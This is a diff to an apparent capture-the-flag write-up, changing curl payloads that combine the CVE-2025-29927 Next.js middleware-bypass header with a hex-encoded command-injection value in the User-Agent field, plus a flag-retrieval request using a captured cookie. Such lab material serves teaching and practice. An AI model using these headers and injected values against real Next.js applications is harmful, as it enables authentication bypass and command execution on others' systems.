@@ -103,12 +103,12 @@ This unsafe `eval` is badly sanitized and allows use to use Hexa to bypass the s
 curl -X POST http://target:3000/api/contact \
   -H "Content-Type: application/json" \
   -H "User-Agent: \x24\x28flag\x29" \
-  -H "x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware" \
+  -H "x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware" \
   -d '{"name":"hacker","email":"exploit@test.com","message":222 /to cause ERROR/}'
 THAT IS THE PAYLOAD STRUCTURE BUT IT IS BETTER TO USE POSTMAN OR BURPSUITE so you capture the cookie returned to the user.
 # Retrieving flag
 curl -X GET http://target:3000/api/i7tiramati \
-      -H "x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware" \
+      -H "x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware" \
       -H "Cookie: special_cookie=value_from_response"
 ```
 </div>
@@ -118,7 +118,7 @@ curl -X GET http://target:3000/api/i7tiramati \
 This challenge draws inspiration from CVE-2025-29927, a Next.js middleware bypass vulnerability where attackers could bypass authentication by adding a specific header:
 
 <div style="background-color:#1e293b; padding:15px; border-radius:5px; color:#94a3b8; font-family:monospace;">
-x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware
+x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware
 </div>
 
 While our challenge focuses on command injection rather than middleware bypass, both exploits demonstrate how HTTP headers can be weaponized to compromise application security.
